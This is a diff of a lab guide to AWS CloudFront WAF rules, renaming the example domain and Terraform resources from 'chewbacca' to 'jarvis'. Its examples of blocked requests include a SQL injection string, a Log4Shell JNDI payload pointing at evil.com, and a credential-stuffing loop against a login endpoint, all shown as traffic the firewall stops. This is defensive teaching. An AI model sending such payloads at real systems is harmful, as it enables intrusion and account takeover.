@@ -25,7 +25,7 @@ Your CloudFront WAF now has **4 active rules + 2 optional rules** for comprehens
 
 **Example Blocked Request**:
 ```bash
-curl "https://app.chewbacca-growl.com/search?q=1 OR 1=1"
+curl "https://app.jarvis-growl.com/search?q=1 OR 1=1"
 # Blocked by Common Rule Set SQLi detection
 # HTTP 403 Forbidden
 ```
@@ -52,7 +52,7 @@ curl "https://app.chewbacca-growl.com/search?q=1 OR 1=1"
 
 **Example Blocked Request**:
 ```bash
-curl -H "X-Test: \${jndi:ldap://evil.com/shell}" https://app.chewbacca-growl.com
+curl -H "X-Test: \${jndi:ldap://evil.com/shell}" https://app.jarvis-growl.com
 # Blocked by Known Bad Inputs (Log4Shell pattern)
 # HTTP 403 Forbidden
 ```
@@ -82,13 +82,13 @@ Per IP, per 5-minute window:
 ```bash
 # Normal user browsing (not blocked)
 for i in {1..50}; do
-  curl https://app.chewbacca-growl.com/page/$i
+  curl https://app.jarvis-growl.com/page/$i
 done
 # All 50 requests succeed (well under 2000/5min)
 
 # Attacker trying credential stuffing (BLOCKED)
 for i in {1..3000}; do
-  curl -X POST https://app.chewbacca-growl.com/login \
+  curl -X POST https://app.jarvis-growl.com/login \
     -d "user=admin&pass=password$i"
 done
 # After request 2001, attacker's IP gets 403 for 5 minutes
@@ -143,7 +143,7 @@ Public website? Decrease limit:
 **Example Blocked Request**:
 ```bash
 # Vulnerable scanner detected
-curl --user-agent "Nmap Scripting Engine" https://app.chewbacca-growl.com
+curl --user-agent "Nmap Scripting Engine" https://app.jarvis-growl.com
 # Blocked by Bot Control
 # HTTP 403 Forbidden
 ```
@@ -420,14 +420,14 @@ rule {
 ```hcl
 # Uncomment in lab2_cloudfront_shield_waf.tf
 
-resource "aws_cloudwatch_log_group" "chewbacca_cf_waf_logs" {
+resource "aws_cloudwatch_log_group" "jarvis_cf_waf_logs" {
   name              = "/aws/wafv2/cloudfront/${var.project_name}"
   retention_in_days = 30
 }
 
-resource "aws_wafv2_web_acl_logging_configuration" "chewbacca_cf_waf_logging" {
-  resource_arn            = aws_wafv2_web_acl.chewbacca_cf_waf01.arn
-  log_destination_configs = [aws_cloudwatch_log_group.chewbacca_cf_waf_logs.arn]
+resource "aws_wafv2_web_acl_logging_configuration" "jarvis_cf_waf_logging" {
+  resource_arn            = aws_wafv2_web_acl.jarvis_cf_waf01.arn
+  log_destination_configs = [aws_cloudwatch_log_group.jarvis_cf_waf_logs.arn]
 }
 ```
 
@@ -436,7 +436,7 @@ resource "aws_wafv2_web_acl_logging_configuration" "chewbacca_cf_waf_logging" {
 ```bash
 # Find requests blocked by RateLimitRule
 aws logs filter-log-events \
-  --log-group-name /aws/wafv2/cloudfront/chewbacca \
+  --log-group-name /aws/wafv2/cloudfront/jarvis \
   --filter-pattern "\"action\":\"BLOCK\" && \"terminatingRuleId\":\"RateLimitRule\"" \
   --start-time $(date -d '1 hour ago' +%s)000 \
   --query 'events[*].message'
@@ -501,3 +501,4 @@ A: "Common Rules catch broad attack patterns that have existed for years (SQLi, 
 **Document Version**: 1.0  
 **Lab 2 Component**: CloudFront WAF Rules  
 **Last Updated**: January 21, 2026
+
